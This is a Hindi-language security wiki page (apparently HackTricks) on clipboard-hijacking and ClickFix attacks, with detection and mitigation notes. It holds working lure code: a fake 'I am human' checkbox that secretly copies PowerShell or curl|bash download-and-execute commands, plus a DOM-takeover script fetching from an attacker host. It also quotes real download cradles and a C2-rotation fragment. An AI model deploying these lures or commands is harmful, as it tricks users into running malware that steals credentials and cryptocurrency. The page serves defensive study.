# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "जो चीज़ आपने खुद कॉपी नहीं की है, उसे कभी पेस्ट न करें।" – पुरानी, लेकिन अब भी सही सलाह

## अवलोकन

Clipboard hijacking – जिसे *pastejacking* भी कहा जाता है – इस बात का फायदा उठाता है कि उपयोगकर्ता अक्सर commands को जाँचे बिना कॉपी-पेस्ट करते हैं। कोई malicious web page (या JavaScript-capable context, जैसे Electron या Desktop application) प्रोग्रामेटिक तरीके से attacker के नियंत्रण वाला text system clipboard में रख देता है। पीड़ितों को, आम तौर पर सावधानी से तैयार किए गए social-engineering निर्देशों के ज़रिए, **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell) दबाने या terminal खोलकर clipboard का content *paste* करने के लिए कहा जाता है, जिससे arbitrary commands तुरंत execute हो जाते हैं।

**कोई file डाउनलोड नहीं होती और कोई attachment नहीं खुलता**, इसलिए यह technique उन अधिकांश e-mail और web-content security controls को bypass कर देती है जो attachments, macros या direct command execution की निगरानी करते हैं। इसीलिए phishing campaigns में NetSupport RAT, Latrodectus loader या Lumma Stealer जैसे commodity malware families पहुँचाने के लिए यह attack लोकप्रिय है।<sup>[[1]](#references)</sup>

## Wallet-address replacement clippers

**Clipboard hijacking** का एक और variant commands paste नहीं करता: यह तब तक इंतज़ार करता है जब तक पीड़ित कोई **cryptocurrency wallet address** कॉपी न करे, फिर paste करने से ठीक पहले चुपचाप उसे attacker के नियंत्रण वाले address से बदल देता है। लंबे wallet formats के मामले में यह खास तौर पर प्रभावी होता है, क्योंकि उपयोगकर्ता अक्सर केवल शुरुआती/आखिरी characters ही जाँचते हैं।<sup>[[8]](#references)</sup>

वास्तविक हमलों में आम तौर पर दिखने वाली विशेषताएँ:
- **Thin loader + nested payload**: दिखने वाला app/exe किसी वैध trading या "profit" tool जैसा लगता है, जबकि असली clipper bundle के भीतर और गहराई में छिपा होता है (उदाहरण के लिए, एक .NET loader जो nested Rust payload लॉन्च करता है)।
- **Regex-driven replacement**: malware `bc1...`, `1...`, `3...`, `0x...`, `addr1...`, `DdzFF...`, `ltc...`, `T...`, `r...` जैसी strings, या यहाँ तक कि सामान्य **44-character Solana-like** strings से मेल खाता है और उन्हें attacker के wallets से बदल देता है।
- **बड़े पैमाने पर wallet rotation**: आधुनिक Windows samples में चोरी के बाद हर बार wallet reputation को नुकसान से बचाने के लिए, किसी एक static address के बजाय प्रति currency replacement wallets की संख्या **हज़ारों** हो सकती है।<sup>[[8]](#references)</sup>

### Windows clipper flow

एक आम implementation में **`AddClipboardFormatListener`** के साथ registered एक hidden window होता है। हर clipboard update पर, malware आम तौर पर ये calls करता है:<sup>[[8]](#references)</sup>
- **`OpenClipboard`** → मौजूदा clipboard data तक पहुँचें।
- **`GetClipboardData`** → text पढ़ें।
- **`EmptyClipboard`** + **`SetClipboardData`** → wallet string को attacker की value से बदलें।

Clippers में अक्सर दिखने वाले minimal hunting regexes:

```regex
\b(bc1)[A-Za-z0-9]{26,45}\b
\b(1)[A-Za-z0-9]{26,35}\b
\b(3)[A-Za-z0-9]{26,35}\b
\b(0x)[A-Za-z0-9]{40,46}\b
\b(addr1)[A-Za-z0-9]{26,108}\b
\b[A-Za-z0-9]{44}\b
```

User-level persistence प्रभाव के लिए पर्याप्त है। देखा गया एक पैटर्न:<sup>[[8]](#references)</sup>
- Payload को **`%APPDATA%\silke\silke.exe`** में कॉपी करें
- `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\` के अंदर **Startup-folder LNK** बनाएँ

Detection के सुझाव:
- ऐसे processes जो clipboard APIs को लगातार call करते हैं और साथ ही `%APPDATA%` तथा user **Startup** folder में लिखते हैं।
- LNK/executable बनाने के बाद wallet-address clipboard को rewrite करना।
- ऐसे archives या नकली-software bundles जिनमें बहुत-सी अनुपयोगी files और एक छोटा launcher हो, जो nested binary शुरू करता हो।

### macOS पर social-engineered quarantine removal + LaunchAgent persistence

macOS पर, कुछ campaigns **`unlocker.command`** helper देते हैं और victim को निर्देश देते हैं कि अगर Gatekeeper कहे कि app damaged है या unidentified developer से है, तो उस पर right-click → **Open** करें। Script बस quarantine हटाती है और पास के `.app` को launch करती है:<sup>[[8]](#references)</sup>

```bash
/usr/bin/xattr -cr "$chosen"
/usr/bin/open "$chosen"
```

यह **Gatekeeper exploit** नहीं है; यह **social-engineered quarantine bypass** है, जो इस तथ्य का फ़ायदा उठाता है कि Gatekeeper के फ़ैसले `com.apple.quarantine` xattr पर निर्भर करते हैं।<sup>[[8]](#references)</sup>

चलने के बाद, clipper मौजूदा user के रूप में persist कर सकता है। इसके लिए यह लिखता है:<sup>[[8]](#references)</sup>
- **`~/launch.sh`** – wrapper script
- **`~/Library/LaunchAgents/com.example..plist`** – `RunAtLoad` और `KeepAlive` वाला LaunchAgent

एक उपयोगी defensive जानकारी यह है कि कुछ samples में **self-healing watchdog** होता है, जो हर ~30 सेकंड में LaunchAgent और wrapper को फिर से लिखता है। अगर आप चल रही process को मारे बिना पहले plist हटाते हैं, तो malware उसे तुरंत फिर से बना सकता है।<sup>[[8]](#references)</sup> सुरक्षित cleanup का क्रम:
1. सक्रिय clipper process को kill करें।
2. LaunchAgent plist को unload/delete करें।
3. `~/launch.sh` और कॉपी किए गए payload को delete करें।

### डिलीवरी नोट: नकली प्रतिष्ठा का असर बढ़ाना

इस family में malware तकनीकी रूप से सरल रह सकता है, जबकि **distribution layer** ज़्यादातर काम करती है: नकली GitHub stars/forks, SourceForge reviews/downloads, YouTube tutorial comments/views और भरोसेमंद दिखने वाली VirusTotal comments/votes का इस्तेमाल binary को चलाने से पहले विश्वसनीय दिखाने के लिए किया जाता है।<sup>[[8]](#references)</sup>

## ज़बरन इस्तेमाल करवाए गए copy buttons और छिपे payloads (macOS one-liners)

कुछ macOS infostealers installer sites (जैसे Homebrew) की नकल करते हैं और **“Copy” button का इस्तेमाल ज़रूरी बनाते हैं**, ताकि users केवल दिखाई देने वाले text को highlight न कर सकें। Clipboard entry में अपेक्षित installer command के साथ जोड़ा गया Base64 payload भी होता है (जैसे `...; echo <b64> | base64 -d | sh`), इसलिए एक बार paste करने से दोनों execute हो जाते हैं, जबकि UI अतिरिक्त stage को छिपा देता है।<sup>[[5]](#references)</sup>

## JavaScript Proof-of-Concept

```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
  const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
  navigator.clipboard.writeText(payload)
    .then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```

पुराने campaigns में `document.execCommand('copy')` का इस्तेमाल होता था, जबकि नए campaigns asynchronous **Clipboard API** (`navigator.clipboard.writeText`) पर निर्भर करते हैं।<sup>[[2]](#references)</sup>

## ClickFix / ClearFake का प्रवाह

1. उपयोगकर्ता typosquatted या compromised site (जैसे `docusign.sa[.]com`) पर जाता है
2. Inject किया गया **ClearFake** JavaScript `unsecuredCopyToClipboard()` helper को call करता है, जो चुपचाप clipboard में Base64-encoded PowerShell one-liner स्टोर करता है।
3. HTML निर्देश victim से कहते हैं: *“**Win + R** दबाएँ, command paste करें और समस्या हल करने के लिए Enter दबाएँ।”*
4. `powershell.exe` execute होता है और एक archive download करता है, जिसमें एक legitimate executable और एक malicious DLL होती है (classic DLL sideloading)।
5. Loader अतिरिक्त stages को decrypt करता है, shellcode inject करता है और persistence इंस्टॉल करता है (जैसे scheduled task) – और अंततः NetSupport RAT / Latrodectus / Lumma Stealer चलाता है।<sup>[[1]](#references)</sup>

### NetSupport RAT की उदाहरण chain

```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```

* `jp2launcher.exe` (वैध Java WebStart) अपनी डायरेक्टरी में `msvcp140.dll` खोजता है।
* दुर्भावनापूर्ण DLL **GetProcAddress** का उपयोग करके APIs को डायनेमिक रूप से resolve करता है, **curl.exe** के ज़रिए दो बाइनरी (`data_3.bin`, `data_4.bin`) डाउनलोड करता है, rolling XOR key `"https://google.com/"` से उन्हें decrypt करता है, अंतिम shellcode inject करता है और **client32.exe** (NetSupport RAT) को `C:\ProgramData\SecurityCheck_v1\` में unzip करता है।<sup>[[1]](#references)</sup>

### Latrodectus Loader

```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```

1. **curl.exe** का उपयोग करके `la.txt` डाउनलोड करता है
2. **cscript.exe** के अंदर JScript downloader निष्पादित करता है
3. MSI payload प्राप्त करता है → हस्ताक्षरित application के साथ `libcef.dll` छोड़ता है → DLL sideloading → shellcode → Latrodectus.<sup>[[1]](#references)</sup>

### Lumma Stealer via MSHTA

```
mshta https://iplogger.co/xxxx =+\\xxx
```

**mshta** call एक hidden PowerShell script लॉन्च करता है, जो `PartyContinued.exe` प्राप्त करता है, `Boat.pst` (CAB) extract करता है, `extrac32` और file concatenation के ज़रिए `AutoIt3.exe` को reconstruct करता है, और अंत में एक `.a3x` script चलाता है, जो browser credentials को `sumeriavgv.digital` पर exfiltrate करता है।<sup>[[1]](#references)</sup>

## ClickFix: Clipboard → PowerShell → JS eval → rotating C2 वाला Startup LNK (PureHVNC)

कुछ ClickFix campaigns file downloads को पूरी तरह छोड़ देते हैं और victims को एक one-liner paste करने का निर्देश देते हैं, जो WSH के ज़रिए JavaScript fetch करके execute करता है, उसे persist करता है और रोज़ C2 rotate करता है। देखा गया chain का उदाहरण:<sup>[[3]](#references)</sup>

```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new 
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```

मुख्य विशेषताएं
- आकस्मिक जांच को विफल करने के लिए Obfuscated URL को runtime पर उलटा जाता है।
- JavaScript, Startup LNK (WScript/CScript) के ज़रिए खुद को persist करता है और मौजूदा दिन के आधार पर C2 चुनता है — जिससे domain को तेज़ी से rotate किया जा सकता है।<sup>[[3]](#references)</sup>

तारीख के आधार पर C2s को rotate करने के लिए इस्तेमाल किया गया न्यूनतम JS fragment:<sup>[[3]](#references)</sup>
```js
function getURL() {
    var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
    var current_datetime = new Date().getTime();
    var no_days = getDaysDiff(0, current_datetime);
    return 'https://'
        + getListElement(C2_domain_list, no_days)
        + '/Y/?t=' + current_datetime
        + '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```

अगला चरण आमतौर पर एक loader deploy करता है, जो persistence स्थापित करता है और RAT (जैसे, PureHVNC) डाउनलोड करता है। यह अक्सर किसी hardcoded certificate पर TLS pin करता है और traffic को chunks में बाँटता है।<sup>[[3]](#references)</sup>

इस variant से जुड़ी detection के सुझाव
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (या `cscript.exe`)।
- Startup artifacts: `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` में LNK, जो `%TEMP%`/`%APPDATA%` के अंतर्गत मौजूद JS path के साथ WScript/CScript चलाता हो।
- Registry/RunMRU और command-line telemetry में `.split('').reverse().join('')` या `eval(a.responseText)` मौजूद होना।
- लंबे command lines के बिना लंबी scripts भेजने के लिए, बड़े stdin payloads के साथ बार-बार चलाया गया `powershell -NoProfile -NonInteractive -Command -`।
- ऐसे Scheduled Tasks जो बाद में किसी updater जैसे दिखने वाले task/path (जैसे, `\GoogleSystem\GoogleUpdater`) के अंतर्गत LOLBins चलाते हों, जैसे `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"`।

Threat hunting
- रोज़ बदलने वाले C2 hostnames और URLs, जिनका pattern `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` हो।
- Clipboard write events को Win+R paste और उसके तुरंत बाद `powershell.exe` के execution से correlate करें।

Blue teams, pastejacking के दुरुपयोग का पता लगाने के लिए clipboard, process-creation और registry telemetry को मिलाकर देख सकती हैं:

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` में **Win + R** commands का इतिहास रखा जाता है — असामान्य Base64 / obfuscated entries देखें।
* Security Event ID **4688** (Process Creation), जहाँ `ParentImage` == `explorer.exe` और `NewProcessName` इनमें से हो: { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }।
* Event ID **4663**, जो संदिग्ध 4688 event से ठीक पहले `%LocalAppData%\Microsoft\Windows\WinX\` या temporary folders में file creation दिखाता हो।
* EDR clipboard sensors (यदि उपलब्ध हों) — `Clipboard Write` के तुरंत बाद शुरू हुई नई PowerShell process से correlate करें।

## IUAM-शैली के verification pages (ClickFix Generator): clipboard से console में copy करना + OS के अनुसार payloads

हाल के campaigns बड़े पैमाने पर नकली CDN/browser verification pages ("Just a moment…", IUAM-शैली) बनाते हैं। ये users को अपने clipboard से OS-विशिष्ट commands कॉपी करके native consoles में डालने के लिए प्रेरित करते हैं। इससे execution browser sandbox से बाहर चला जाता है और यह Windows तथा macOS, दोनों पर काम करता है।<sup>[[4]](#references)</sup>

Builder से बने pages की प्रमुख विशेषताएँ
- Payloads को OS के अनुसार ढालने के लिए `navigator.userAgent` से OS का पता लगाना (Windows PowerShell/CMD बनाम macOS Terminal)। भ्रम बनाए रखने के लिए unsupported OS पर वैकल्पिक decoys/no-ops भी दिए जा सकते हैं।
- साधारण UI actions (checkbox/Copy) पर clipboard में अपने-आप copy करना, जबकि दिखाई देने वाला text clipboard के content से अलग हो सकता है।
- Mobile blocking और चरण-दर-चरण निर्देशों वाला popover: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter।
- वैकल्पिक obfuscation और single-file injector, जो compromised site के DOM को Tailwind-styled verification UI से बदल देता है (नए domain registration की ज़रूरत नहीं)।<sup>[[4]](#references)</sup>

उदाहरण: clipboard mismatch + OS के अनुसार branching
```html
<div class="space-y-2">
  <label class="inline-flex items-center space-x-2">
    <input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
  </label>
  <div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
  // UI shows a harmless string, but clipboard gets the real command
  navigator.clipboard.writeText(real).then(()=>{
    document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
  });
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```

macOS के प्रारंभिक रन की persistence
- `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` का उपयोग करें, ताकि टर्मिनल बंद होने के बाद भी execution जारी रहे और दिखाई देने वाले artifacts कम हों।<sup>[[4]](#references)</sup>

compromised sites पर उसी जगह page takeover
```html
<script>
(async () => {
  const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
  document.documentElement.innerHTML = html;                 // overwrite DOM
  const s = document.createElement('script');
  s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
  document.head.appendChild(s);
})();
</script>
```

IUAM-शैली के lures के लिए विशिष्ट detection और hunting के विचार
- Web: ऐसे पेज जो Clipboard API को verification widgets से bind करते हैं; दिखाए गए text और clipboard payload में mismatch; `navigator.userAgent` के आधार पर branching; संदिग्ध संदर्भों में Tailwind + single-page replace।
- Windows endpoint: browser interaction के तुरंत बाद `explorer.exe` → `powershell.exe`/`cmd.exe`; `%TEMP%` से batch/MSI installers का execution।
- macOS endpoint: browser events के आसपास Terminal/iTerm से `bash`/`curl`/`base64 -d` को `nohup` के साथ spawn करना; Terminal बंद होने के बाद भी background jobs का चलते रहना।
- `RunMRU` Win+R history और clipboard writes का बाद में होने वाले console process creation से संबंध जोड़ें।

सहायक techniques के लिए यह भी देखें

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 के fake CAPTCHA / ClickFix के नए रूप (ClearFake, Scarlet Goldfinch)

- ClearFake, WordPress sites को compromise करना जारी रखता है और loader JavaScript inject करता है, जो external hosts (Cloudflare Workers, GitHub/jsDelivr) और यहाँ तक कि blockchain “etherhiding” calls (जैसे, Binance Smart Chain API endpoints जैसे `bsc-testnet.drpc[.]org` पर POSTs) को chain करके मौजूदा lure logic खींचता है। हाल के overlays में ऐसे fake CAPTCHAs का व्यापक इस्तेमाल होता है, जो users को कुछ भी download करने के बजाय one-liner copy/paste करने का निर्देश देते हैं (T1204.004)।<sup>[[6]](#references)</sup>
- शुरुआती execution का जिम्मा तेज़ी से signed script hosts/LOLBAS को दिया जा रहा है। जनवरी 2026 की chains में पहले इस्तेमाल होने वाले `mshta` की जगह built-in `SyncAppvPublishingServer.vbs` को `WScript.exe` के ज़रिए execute किया गया। इसमें remote content fetch करने के लिए PowerShell जैसे arguments, aliases और wildcards दिए गए थे:<sup>[[6]](#references)</sup>

```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```

  - `SyncAppvPublishingServer.vbs` पर हस्ताक्षर किए गए हैं और आमतौर पर App-V द्वारा उपयोग किया जाता है; `WScript.exe` और असामान्य arguments (`gal`/`gcm` aliases, wildcarded cmdlets, jsDelivr URLs) के साथ मिलकर यह ClearFake के लिए एक high-signal LOLBAS stage बन जाता है।<sup>[[6]](#references)</sup>
- फरवरी 2026 के fake CAPTCHA payloads फिर से pure PowerShell download cradles पर आ गए। दो live examples:<sup>[[6]](#references)</sup>

```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```

  - पहली chain एक in-memory `iex(irm ...)` grabber है; दूसरी `WinHttp.WinHttpRequest.5.1` के ज़रिए stage करती है, एक अस्थायी `.ps1` लिखती है, फिर hidden window में `-ep bypass` के साथ launch करती है।<sup>[[6]](#references)</sup>

इन variants के लिए detection/hunting tips
- Process lineage: browser → `explorer.exe` → clipboard writes/Win+R के तुरंत बाद `wscript.exe ...SyncAppvPublishingServer.vbs` या PowerShell cradles।
- Command-line keywords: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker domains, या raw IP वाले `iex(irm ...)` patterns।
- Network: web browsing के तुरंत बाद script hosts/PowerShell से CDN worker hosts या blockchain RPC endpoints पर outbound traffic।
- File/registry: `%TEMP%` के अंतर्गत अस्थायी `.ps1` बनना, साथ ही इन one-liners वाले RunMRU entries; external URLs या obfuscated alias strings के साथ execute होने वाले signed-script LOLBAS (WScript/cscript/mshta) को block/alert करें।

## जून 2026 ClickFix tradecraft: paste telemetry, नकली verification comments और LOLBin chaining

Red Canary की हालिया telemetry से पता चलता है कि स्थिर indicator **एक सटीक command नहीं**, बल्कि **user-assisted paste-and-run**, **trusted interpreters/LOLBins**, **obfuscated flags**, **remote retrieval** और **immediate execution** का संयोजन है।<sup>[[7]](#references)</sup>

### उल्लेखनीय operator patterns

- **Paste confirmation telemetry**: कुछ payloads असली stage से पहले `curl -fsS -4 --connect-timeout 5 --max-time 10 -X POST ... /api/metrics/run?event=pasted` चलाते हैं। इससे window को छोटा और शांत रखते हुए user interaction की पुष्टि होती है।
- **नकली verification comments**: PowerShell one-liners में `# Security check ✔️ I'm not a robot Verification ID: 138105` जैसे strings जोड़े जा सकते हैं, ताकि Run / `cmd.exe` / PowerShell history में paste होने के बाद भी command CAPTCHA से संबंधित दिखे।
- **Dynamic URL reconstruction**: `iex(irm(('ccud'+'mcx')+('.x'+'yz/u')))` command line में static URL से बचता है, लेकिन फिर भी in-memory download-and-execute करता है।
- **Masqueraded installer execution**: `"C:\WINDOWS\system32\msIeXec.exe" -PAcKᵃGE http://... /Q` flags में असामान्य casing और Unicode-जैसे characters का दुरुपयोग करता है, ताकि brittle detections को चकमा देते हुए भी `msiexec.exe` जैसा दिखे।
- **Caret-escaped LOLBin chains**: `cmd.exe` `^` escapes (`s^t^a^r^t`, `^c^u^r^l^`, `^m^s^h^t^a^`) से keywords छिपा सकता है, nested shell को minimized mode में शुरू कर सकता है, attacker content को `.pdf` जैसे harmless extension के साथ save कर सकता है, और फिर `mshta` के ज़रिए उसे execute कर सकता है।<sup>[[7]](#references)</sup>

## Mitigations

1. Browser hardening – clipboard write-access (`dom.events.asyncClipboard.clipboardItem` आदि) disable करें या user gesture आवश्यक करें।
2. Security awareness – users को sensitive commands *type* करना या पहले text editor में paste करना सिखाएँ।
3. PowerShell Constrained Language Mode / Execution Policy + Application Control का उपयोग arbitrary one-liners को block करने के लिए करें।
4. Network controls – ज्ञात pastejacking और malware C2 domains पर outbound requests block करें।

## संबंधित Tricks

* **Discord Invite Hijacking** अक्सर users को malicious server में फुसलाने के बाद उसी ClickFix approach का दुरुपयोग करता है:
  
{{#ref}}
  discord-invite-hijacking.md
  {{#endref}}

## References

- [1] [क्लिक को ठीक करें: ClickFix Attack Vector को रोकना](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [2] [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [3] [Check Point Research – Pure Curtain के पीछे: RAT से Builder और फिर Coder तक](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [4] [ClickFix Factory: IUAM ClickFix Generator का पहला खुलासा](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [5] [2025, Infostealer का साल](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [6] [Red Canary – Intelligence Insights: फ़रवरी 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)
- [7] [Red Canary – Intelligence Insights: जून 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-june-2026/)
- [8] [Check Point Research – Stars से Upvotes तक: Crypto Clipboard Hijacker को बढ़ावा देती नकली Reputation](https://research.checkpoint.com/2026/from-stars-to-upvotes-fake-reputation-fueling-a-crypto-clipboard-hijacker/)
{{#include ../../banners/hacktricks-training.md}}
